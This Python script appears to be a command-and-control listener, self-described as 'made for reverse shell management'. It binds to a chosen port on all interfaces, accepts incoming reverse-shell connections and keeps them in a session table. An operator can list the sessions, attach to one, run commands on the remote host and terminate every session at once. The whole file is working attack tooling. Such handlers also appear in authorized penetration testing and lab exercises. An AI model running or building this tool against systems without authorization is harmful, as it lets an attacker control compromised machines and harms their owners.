import socket
import threading
import sys
import queue
import time
import re

# ANSI escape codes for colors
RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"
BLUE = "\033[94m"  # Blue for LSTNR$
ORANGE = "\033[38;5;214m"  # Orange for Session prompt

HOST = "0.0.0.0"
PORT = None  # Port will be set from command-line arguments

sessions = {}
session_id = 0
lock = threading.Lock()

notifications = queue.Queue()  # Queue to store new session messages

def print_error(error_message):
    """Prints errors in red."""
    print(f"{RED}[!] ERROR: {error_message}{RESET}")

def print_commands():
    """Prints a formal list of available commands."""
    print("\n[+] List of commands:")
    print("   ls        - List active sessions")
    print("   cs <id>   - Connect to a specific session by ID")
    print("   bs        - Background the current session")
    print("   exit      - Terminate the current session or exit the program")
    print()

def handle_client(client_socket, addr, session_number):
    """Handles communication with a specific client session."""
    print(f"[+] Session {session_number} connected from {addr}")

    try:
        while True:
            prompt = f"{ORANGE}Session[{session_number}]@{addr[0]}: {RESET}"
            command = input(prompt).strip()

            if command == "":
                continue

            if command.lower() == "bs":
                print(f"[*] Session {session_number} moved to background.")
                return
            elif command.lower() == "exit":
                print(f"[-] Terminating session {session_number}.")
                client_socket.send(b"exit\n")
                client_socket.close()
                with lock:
                    del sessions[session_number]
                return

            # Send the command to the remote session (first time)
            client_socket.send(command.encode() + b"\n")
            
            # Wait for the first response (which is likely just the echo of the command)
            first_response = ""
            while True:
                part = client_socket.recv(4096).decode(errors="ignore")
                first_response += part
                if len(part) < 4096:
                    break

            # Discard the first response (this is the echoed command)
            # Print nothing for the first response

            # Now, send the command again (second time) and capture the output
            client_socket.send(command.encode() + b"\n")

            # Clear the second response
            second_response = ""
            while True:
                part = client_socket.recv(4096).decode(errors="ignore")
                second_response += part
                if len(part) < 4096:
                    break

            # Clean up the second response (remove any unwanted prompt)
            if second_response:
                # Remove the prompt or echo lines like `$`, `ubuntu@`, or `PS`
                second_response = '\n'.join([line for line in second_response.splitlines() if line and not re.match(r'^\$|^ubuntu@|^root@|^PS ', line)])

                # Only print the real output (second response)
                if second_response.strip():  # Avoid printing empty lines
                    print(f"\n{second_response}", end="\n\n")

    except KeyboardInterrupt:
        print(f"\n[*] Session {session_number} moved to background.")
        return
    except Exception as e:
        print_error(str(e))

    print(f"[-] Session {session_number} disconnected.")
    with lock:
        del sessions[session_number]



def session_manager():
    """Main menu that allows session management."""
    time.sleep(1)  # 🟢 Wait for 1 second before dropping into LSTNR$
    
    while True:
        try:
            while not notifications.empty():
                print(notifications.get())

            command = input(f"{BLUE}LSTNR$ {RESET}").strip()
            if command == "":
                print_commands()
            elif command.lower() == "ls":
                while not notifications.empty():
                    print(notifications.get())

                print("\n+-----------------------+")
                print("| ID  | IP ADDRESS      |")
                print("+-----------------------+")
                for sid, session in sessions.items():
                    print(f"| {sid:<3} | {session['addr'][0]:<15} |")
                print("+-----------------------+\n")
            elif command.startswith("cs "):
                try:
                    sid = int(command.split()[1])
                    if sid in sessions:
                        handle_client(sessions[sid]['socket'], sessions[sid]['addr'], sid)
                    else:
                        print_error("Invalid session ID.")
                except:
                    print_error("Invalid command. Usage: cs <session_id>")
            elif command.lower() == "die":
                print("[-] Terminating all sessions...")
                with lock:
                    for sid in list(sessions.keys()):
                        sessions[sid]["socket"].send(b"exit\n")
                        sessions[sid]["socket"].close()
                        del sessions[sid]
                print("[+] All sessions terminated.")
            elif command.lower() == "exit":
                print("Killing all sessions.")
                print("Shutting down LSTNR.")
                break
            else:
                print_error("Unknown command. Use 'ls', 'cs <id>', 'bs', 'exit', or 'die'.")
                print_commands()
        except KeyboardInterrupt:
            print("\n[*] Type 'exit' to close LSTNR.")
        except Exception as e:
            print_error(str(e))

def start_listener():
    """Starts the listener and accepts incoming connections."""
    global session_id

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((HOST, PORT))
    except OSError as e:
        print_error(e)
        sys.exit(1)

    server.listen(5)
    print(""" 
    ██╗     ███████╗████████╗███╗   ██╗██████╗ 
    ██║     ██╔════╝╚══██╔══╝████╗  ██║██╔══██╗
    ██║     ███████╗   ██║   ██╔██╗ ██║██████╔╝
    ██║     ╚════██║   ██║   ██║╚██╗██║██╔══██╗
    ███████╗███████║   ██║   ██║ ╚████║██║  ██║
    ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
    Remote Command & Control - v1.3
    - MADE FOR REVERSE SHELL MANAGEMENT
    """)
    print(f"[*] Listening on {HOST}:{PORT}")
    
    while True:
        try:
            client_socket, addr = server.accept()
            with lock:
                session_id += 1
                sessions[session_id] = {"socket": client_socket, "addr": addr}
            notifications.put(f"{GREEN}[+] New connection from {addr}. Assigned Session ID: {session_id}{RESET}")
        except Exception as e:
            print_error(str(e))

if __name__ == "__main__":
    if len(sys.argv) != 3 or sys.argv[1] != "-p":
        print_error("Usage: ./listener.py -p <port>")
        sys.exit(1)

    try:
        PORT = int(sys.argv[2])
        if PORT < 1 or PORT > 65535:
            raise ValueError
    except ValueError:
        print_error("Invalid port number. Use a port between 1 and 65535.")
        sys.exit(1)

    try:
        listener_thread = threading.Thread(target=start_listener, daemon=True)
        listener_thread.start()

        session_manager()
    except KeyboardInterrupt:
        print("\n[-] Exiting... Closing all connections.")
        for sid in list(sessions.keys()):
            try:
                sessions[sid]["socket"].send(b"exit\n")
                sessions[sid]["socket"].close()
            except:
                pass
        sys.exit(0)
    except Exception as e:
        print_error(str(e))
                           
